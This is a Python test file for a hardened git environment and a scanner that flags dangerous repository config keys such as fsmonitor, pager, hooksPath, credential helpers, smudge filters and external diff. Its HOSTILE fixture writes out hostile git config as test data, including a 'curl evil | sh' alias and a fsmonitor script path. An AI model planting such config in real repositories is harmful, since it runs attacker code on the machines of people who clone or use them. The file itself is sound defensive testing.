"""ROADMAP #49: hardened git environment + repo-config scan."""

from __future__ import annotations

import shutil
import subprocess
from collections.abc import Iterator
from pathlib import Path

import pytest

from bog_agents.git_env import (
    ALWAYS_INERT,
    HARDENED_GIT_CONFIG,
    NO_EXTERNAL_DIFF,
    format_findings,
    hardened_git_env,
    parse_git_config,
    parse_null_config,
    pinned_git_config,
    repo_config_fingerprint,
    reset_trusted_config_cache,
    scan_repo_config,
)

HOSTILE = """[core]
\trepositoryformatversion = 0
\tfsmonitor = /tmp/evil.sh
\thooksPath = .githooks
\tpager = "less -R"
[alias]
\tst = status
\tpwn = "!curl evil | sh"
[filter "lfs"]
\tclean = git-lfs clean -- %f
\tsmudge = git-lfs smudge -- %f
[filter "evil"]
\tsmudge = /bin/evil
[credential]
\thelper = !echo pwned
[remote "origin"]
\turl = https://example.com/x.git
"""


@pytest.fixture
def trusted_none() -> Iterator[None]:
    """Pretend the machine has no system/global git config (every key falls back to inert)."""
    reset_trusted_config_cache({})
    yield
    reset_trusted_config_cache()


def test_hardened_env_overrides_every_key_and_keeps_existing_overrides(trusted_none: None) -> None:
    env = hardened_git_env({"PATH": "/bin", "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "user.name", "GIT_CONFIG_VALUE_0": "x"})
    assert "GIT_CONFIG_NOSYSTEM" not in env  # the system config is admin-controlled, not repo-controlled
    assert env["GIT_TERMINAL_PROMPT"] == "0"
    assert env["GIT_OPTIONAL_LOCKS"] == "0"
    assert env["GIT_CONFIG_COUNT"] == str(1 + len(HARDENED_GIT_CONFIG))
    assert env["GIT_CONFIG_KEY_0"] == "user.name"  # pre-existing override kept in front
    keys = {env[f"GIT_CONFIG_KEY_{i}"]: env[f"GIT_CONFIG_VALUE_{i}"] for i in range(1, 1 + len(HARDENED_GIT_CONFIG))}
    assert keys["core.fsmonitor"] == "false"
    assert keys["core.pager"] == "cat"
    assert keys["core.editor"] == "true"
    assert Path(keys["core.hooksPath"]).is_dir()
    assert keys["credential.helper"] == ""
    assert env["PATH"] == "/bin"
    with_extra = hardened_git_env({"A": "1"}, extra={"GIT_INDEX_FILE": "/tmp/idx"})
    assert with_extra["GIT_INDEX_FILE"] == "/tmp/idx"


def test_trusted_scopes_survive_and_repo_scope_does_not() -> None:
    reset_trusted_config_cache(
        {
            "credential.helper": ["manager", "store --file ~/.creds"],
            "core.sshcommand": ["ssh -i ~/.ssh/work"],
            "core.hookspath": ["~/.githooks"],
            "core.editor": ["notepad"],  # ALWAYS_INERT: an internal call must never open an editor
            "core.autocrlf": ["true"],  # not a hardened key: untouched, so line endings behave as configured
        }
    )
    try:
        pinned = pinned_git_config({})
    finally:
        reset_trusted_config_cache()
    helpers = [v for k, v in pinned if k == "credential.helper"]
    assert helpers == ["", "manager", "store --file ~/.creds"]  # reset first, then the user's own helpers
    as_dict = dict(pinned)
    assert as_dict["core.sshCommand"] == "ssh -i ~/.ssh/work"
    assert as_dict["core.hooksPath"] == "~/.githooks"
    assert as_dict["core.editor"] == "true"
    assert "core.autocrlf" not in as_dict
    assert all(k in ALWAYS_INERT or k in dict(HARDENED_GIT_CONFIG) for k, _ in pinned)


def test_parse_null_config_handles_multi_values_and_bare_keys() -> None:
    blob = "credential.helper\nmanager\x00credential.helper\nstore\x00core.bare\x00Core.Editor\nvim\x00"
    parsed = parse_null_config(blob)
    assert parsed["credential.helper"] == ["manager", "store"]
    assert parsed["core.bare"] == [""]
    assert parsed["core.editor"] == ["vim"]


@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_discovery_reads_real_global_config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    gconf = tmp_path / "gitconfig"
    gconf.write_text("[core]\n\tsshCommand = ssh -o Trusted=yes\n[credential]\n\thelper = manager\n", encoding="utf-8")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(gconf))
    reset_trusted_config_cache()
    try:
        pinned = dict(pinned_git_config())
        assert pinned["core.sshCommand"] == "ssh -o Trusted=yes"
        assert ("credential.helper", "manager") in pinned_git_config()
    finally:
        reset_trusted_config_cache()


def test_parse_and_scan_repo_config(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text(HOSTILE, encoding="utf-8")
    pairs = dict(parse_git_config(HOSTILE))
    assert pairs["core.fsmonitor"] == "/tmp/evil.sh"
    assert pairs["alias.pwn"] == "!curl evil | sh"
    assert pairs["filter.lfs.clean"].startswith("git-lfs")
    findings = {f.key: f for f in scan_repo_config(tmp_path)}
    assert set(findings) == {"core.fsmonitor", "core.hookspath", "core.pager", "alias.pwn", "filter.evil.smudge", "credential.helper"}
    assert "RCE" in findings["core.fsmonitor"].reason
    assert "filter.lfs.clean" not in findings  # git-lfs is the benign, expected case
    text = format_findings(list(findings.values()))
    assert "core.fsmonitor = /tmp/evil.sh" in text
    fp = repo_config_fingerprint(tmp_path)
    assert fp.startswith("sha256:")
    (tmp_path / ".git" / "config").write_text(HOSTILE + "[user]\n\tname = x\n", encoding="utf-8")
    assert repo_config_fingerprint(tmp_path) != fp


def test_clean_or_missing_config(tmp_path: Path) -> None:
    assert scan_repo_config(tmp_path) == []
    assert repo_config_fingerprint(tmp_path) == ""
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("[core]\n\tbare = false\n\tfsmonitor = false\n[user]\n\tname = me\n", encoding="utf-8")
    assert scan_repo_config(tmp_path) == []


def test_worktree_pointer_file(tmp_path: Path) -> None:
    main = tmp_path / "main"
    (main / ".git").mkdir(parents=True)
    (main / ".git" / "config").write_text("[core]\n\tpager = evil\n", encoding="utf-8")
    wt = tmp_path / "wt"
    wt.mkdir()
    (wt / ".git").write_text(f"gitdir: {main / '.git'}\n", encoding="utf-8")
    assert [f.key for f in scan_repo_config(wt)] == ["core.pager"]


@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_real_git_ignores_repo_pager_under_hardened_env(tmp_path: Path) -> None:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True, capture_output=True)
    subprocess.run(["git", "-C", str(tmp_path), "config", "core.pager", "evil-pager"], check=True, capture_output=True)
    plain = subprocess.run(["git", "-C", str(tmp_path), "config", "core.pager"], capture_output=True, text=True, check=False)
    hardened = subprocess.run(
        ["git", "-C", str(tmp_path), "config", "core.pager"],
        capture_output=True,
        text=True,
        check=False,
        env=hardened_git_env(),
    )
    assert plain.stdout.strip() == "evil-pager"
    assert hardened.stdout.strip() == "cat"


@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_repo_external_diff_never_runs(tmp_path: Path) -> None:
    """A cloned `.git/config` naming `diff.external` must not run it — and the evidence diff must still render."""
    from bog_agents.evidence import collect_git_evidence

    def git(*args: str) -> None:
        subprocess.run(["git", "-C", str(tmp_path), *args], check=True, capture_output=True)

    git("init", "-q")
    git("config", "user.email", "t@t.t")
    git("config", "user.name", "t")
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-q", "-m", "init")
    git("config", "diff.external", "definitely-not-a-program")
    (tmp_path / "a.py").write_text("x = 2\n", encoding="utf-8")
    plain = subprocess.run(["git", "-C", str(tmp_path), "diff", "HEAD"], capture_output=True, text=True, check=False)
    assert plain.returncode != 0  # git really tries to spawn it
    hardened = subprocess.run(
        ["git", "-C", str(tmp_path), "diff", *NO_EXTERNAL_DIFF, "HEAD"], capture_output=True, text=True, check=False, env=hardened_git_env()
    )
    assert hardened.returncode == 0 and "+x = 2" in hardened.stdout
    _stat, diff = collect_git_evidence(tmp_path)
    assert "-x = 1" in diff and "+x = 2" in diff
    assert [f.key for f in scan_repo_config(tmp_path)] == ["diff.external"]
